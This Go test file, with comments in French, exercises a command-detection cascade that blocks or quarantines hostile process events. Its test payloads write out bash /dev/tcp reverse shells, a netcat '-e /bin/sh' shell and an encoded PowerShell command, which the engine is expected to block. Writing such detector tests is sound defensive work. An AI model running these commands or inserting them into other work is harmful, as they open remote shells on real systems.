// Package engine — inference_cascade_test.go
// Tests de conformité de la cascade L0 / L1a / L1b et règle d'invariance défensive.
package engine

import (
	"path/filepath"
	"strings"
	"testing"
)

func TestInferenceCascade_PipelineAndMonotonicity(t *testing.T) {
	cb := NewCodebook(nil)
	gz := NewGrayZoneDecider(DefaultGrayZoneConfig())
	cascade := NewCascadeEngine(cb, gz)

	// Charger la disquette LOLBAS forgée
	floppyPath := filepath.Join(testWittgensteinDataDir(t), "floppies", "floppy_lolbas.c2book")
	disk, err := LoadFloppyMmap(floppyPath, WittgensteinFloppyKey(FloppyFamilyLOLBAS))
	if err != nil {
		t.Fatalf("Impossible de charger floppy_lolbas: %v", err)
	}
	defer disk.Close()
	cascade.MountFloppy(1, disk)

	// 1. Test Veto Immédiat Couche 0 (Mot-clé réflexe "bash -i")
	var evL0 Probe_event_t
	evL0.Subsystem = 1 // SubProc
	evL0.Action = 1    // ActExec
	copy(evL0.Payload[:], "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1")

	vL0 := cascade.EvaluateEvent(&evL0)
	if vL0.Stage != StageL0 {
		t.Errorf("Verdict Stage = %d, attendu StageL0 (0)", vL0.Stage)
	}
	if vL0.Action != VerdictBlock {
		t.Errorf("Verdict Action = %d, attendu VerdictBlock (2)", vL0.Action)
	}

	// 2. Test Règle de Non-Adoucissement (Monotonie défensive)
	if act := cascade.applyNonSoftening(VerdictBlock, VerdictPass); act != VerdictBlock {
		t.Errorf("Violation de non-adoucissement : Block adouci en %d", act)
	}
	if act := cascade.applyNonSoftening(VerdictQuarantine, VerdictPass); act != VerdictQuarantine {
		t.Errorf("Violation de non-adoucissement : Quarantine adouci en %d", act)
	}

	// 3. Test Trafic Nominal / Bénin
	var evNominal Probe_event_t
	evNominal.Subsystem = 1
	evNominal.Action = 1
	copy(evNominal.Payload[:], "ls -la")
	vNominal := cascade.EvaluateEvent(&evNominal)
	if vNominal.Action == VerdictBlock {
		t.Errorf("Faux positif sur commande nominale 'ls -la'")
	}
}

func TestInferenceCascade_ZeroAlloc(t *testing.T) {
	cb := NewCodebook(nil)
	gz := NewGrayZoneDecider(DefaultGrayZoneConfig())
	cascade := NewCascadeEngine(cb, gz)

	floppyPath := filepath.Join(testWittgensteinDataDir(t), "floppies", "floppy_lolbas.c2book")
	disk, err := LoadFloppyMmap(floppyPath, WittgensteinFloppyKey(FloppyFamilyLOLBAS))
	if err != nil {
		t.Fatalf("Impossible de charger floppy_lolbas: %v", err)
	}
	defer disk.Close()
	cascade.MountFloppy(1, disk)

	var ev Probe_event_t
	ev.Subsystem = 1
	ev.Action = 1
	copy(ev.Payload[:], "powershell.exe -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=")

	allocs := testing.AllocsPerRun(1000, func() {
		_ = cascade.EvaluateEvent(&ev)
	})
	if allocs != 0 {
		t.Fatalf("Cascade AllocsPerRun = %.2f, attendu 0 (0 B/op)", allocs)
	}
}

func mountLOLBAS(t *testing.T) (*CascadeEngine, *FloppyDisk) {
	t.Helper()
	cascade := NewCascadeEngine(NewCodebook(nil), NewGrayZoneDecider(DefaultGrayZoneConfig()))
	disk, err := LoadFloppyMmap(filepath.Join(testWittgensteinDataDir(t), "floppies", "floppy_lolbas.c2book"), WittgensteinFloppyKey(FloppyFamilyLOLBAS))
	if err != nil {
		t.Fatalf("Impossible de charger floppy_lolbas: %v", err)
	}
	t.Cleanup(func() { disk.Close() })
	cascade.MountFloppy(FloppyFamilyLOLBAS, disk)
	return cascade, disk
}

// Une charge longue illisible (page recyclée) doit produire au moins une
// quarantaine, jamais un passage évalué sur le seul préfixe ; un mot-clé
// hostile dans le préfixe authentique aggrave en veto.
func TestInferenceCascade_ArenaFailClosed(t *testing.T) {
	cascade, _ := mountLOLBAS(t)
	pool := NewArenaPool()
	cascade.arena = pool

	var benignPrefix, hostilePrefix Probe_event_t
	for _, ev := range []*Probe_event_t{&benignPrefix, &hostilePrefix} {
		ev.Subsystem, ev.Action = 1, 1
	}
	pool.StorePayload(&benignPrefix, []byte(strings.Repeat("echo ok; ", 12)+"bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"))
	pool.StorePayload(&hostilePrefix, []byte("bash -i >& /dev/tcp/10.0.0.1/4242 0>&1 ; "+strings.Repeat("sleep 1; ", 12)))
	if v := cascade.EvaluateEvent(&benignPrefix); v.Action != VerdictBlock {
		t.Fatalf("avant recyclage : action=%d, attendu Block (mot-clé hors préfixe)", v.Action)
	}
	for i := 0; i < ArenaCapacity; i++ {
		var w Probe_event_t
		pool.StorePayload(&w, []byte(strings.Repeat("x", 200)))
	}

	v := cascade.EvaluateEvent(&benignPrefix)
	if v.Action != VerdictQuarantine || v.Stage != StageL0 || v.Flags&FlagArenaInvalid == 0 {
		t.Fatalf("après recyclage : action=%d stage=%d drapeaux=0x%X ; attendu Quarantine L0 FlagArenaInvalid", v.Action, v.Stage, v.Flags)
	}
	if v := cascade.EvaluateEvent(&hostilePrefix); v.Action != VerdictBlock {
		t.Fatalf("préfixe hostile après recyclage : action=%d, attendu Block", v.Action)
	}
}

// Le contexte ontologique ne certifie en L0 que sur provenance établie.
func TestInferenceCascade_OntologicalContext(t *testing.T) {
	cascade, _ := mountLOLBAS(t)

	tty := DeriveCascadeContext(ProcessProvenance{PID: 4242, UID: 1000, EUID: 1000, LoginSession: true, HasTTY: true, ExeTarget: []byte("/usr/bin/ls")})
	if tty != (CascadeContext{Subject: SubjUserInteractive, Context: CtxInteractiveTTY}) {
		t.Fatalf("session TTY : %+v", tty)
	}
	unit := DeriveCascadeContext(ProcessProvenance{PID: 812, UID: 0, EUID: 0, SystemdUnit: true, ExeTarget: []byte("/usr/sbin/logrotate")})
	if unit != (CascadeContext{Subject: SubjRootSystemd, Context: CtxSystemdUnit}) {
		t.Fatalf("unité systemd : %+v", unit)
	}
	if c := DeriveCascadeContext(ProcessProvenance{PID: 4242, UID: 1000, EUID: 0, LoginSession: true, HasTTY: true}); c.Context != CtxDefault {
		t.Fatalf("élévation setuid certifiée : %+v", c)
	}
	if c := DeriveCascadeContext(ProcessProvenance{PID: 4242, UID: 1000, EUID: 1000, LoginSession: true, HasTTY: true, ExeTarget: []byte("/tmp/x")}); c.Context != CtxTmpResidence {
		t.Fatalf("résidence temporaire masquée par la session : %+v", c)
	}

	var ev Probe_event_t
	ev.Subsystem, ev.Action = 1, 1
	copy(ev.Payload[:], "ls -la /var/log")
	if v := cascade.EvaluateEventCtx(&ev, tty); v.Action != VerdictPass || v.Stage != StageL0 || v.OntoContext != CtxInteractiveTTY {
		t.Fatalf("commande courte en session TTY : action=%d stage=%d ctx=%d ; attendu Pass L0", v.Action, v.Stage, v.OntoContext)
	}
	if v := cascade.EvaluateEventCtx(&ev, unit); v.Action != VerdictPass || v.Stage != StageL0 {
		t.Fatalf("commande courte sous unité systemd : action=%d stage=%d ; attendu Pass L0", v.Action, v.Stage)
	}
	if v := cascade.EvaluateEvent(&ev); v.Stage == StageL0 {
		t.Fatal("sans provenance, la commande a été certifiée en L0")
	}

	// Le veto mot-clé précède la certification ontologique.
	var hostile Probe_event_t
	hostile.Subsystem, hostile.Action = 1, 1
	copy(hostile.Payload[:], "nc -e /bin/sh 10.0.0.1 1")
	if v := cascade.EvaluateEventCtx(&hostile, tty); v.Action != VerdictBlock {
		t.Fatalf("mot-clé hostile en session TTY : action=%d, attendu Block", v.Action)
	}
	// Un contexte hostile établi est un veto ontologique.
	memfd := DeriveCascadeContext(ProcessProvenance{PID: 4242, UID: 1000, EUID: 1000, LoginSession: true, HasTTY: true, IsMemfd: true})
	if v := cascade.EvaluateEventCtx(&ev, memfd); v.Action != VerdictBlock || v.Stage != StageL0 {
		t.Fatalf("exécution memfd : action=%d stage=%d ; attendu Block L0", v.Action, v.Stage)
	}
}

// La sonde conforme embarquée par la disquette est active dès le montage :
// des commandes d'administration d'apprentissage sont confirmées bénignes en L1a.
func TestInferenceCascade_FloppyProbeActive(t *testing.T) {
	cascade, disk := mountLOLBAS(t)
	if disk.Probe() == nil {
		t.Fatal("la disquette LOLBAS n'embarque pas de sonde L1a")
	}
	confirmed := 0
	for i, cmd := range BenignAdminCommands() {
		if !IsBenignTrainIndex(i) {
			continue
		}
		var ev Probe_event_t
		ev.Subsystem, ev.Action = 1, 1
		cascade.arena.StorePayload(&ev, []byte(cmd))
		if v := cascade.EvaluateEvent(&ev); v.Stage == StageL1a && v.Action == VerdictPass {
			confirmed++
		}
	}
	if confirmed == 0 {
		t.Fatal("aucune confirmation L1a : la sonde embarquée n'est pas consultée")
	}
	t.Logf("confirmations bénignes L1a sur l'apprentissage : %d", confirmed)
}

func TestInferenceCascade_ZeroAlloc_LongPayload(t *testing.T) {
	cascade, _ := mountLOLBAS(t)
	pool := NewArenaPool()
	cascade.arena = pool
	var ev Probe_event_t
	ev.Subsystem, ev.Action = 1, 1
	pool.StorePayload(&ev, []byte(strings.Repeat("Get-Service | Sort-Object Status; ", 8)))
	allocs := testing.AllocsPerRun(1000, func() {
		_ = cascade.EvaluateEvent(&ev)
	})
	if allocs != 0 {
		t.Fatalf("Cascade charge longue AllocsPerRun = %.2f, attendu 0", allocs)
	}
}
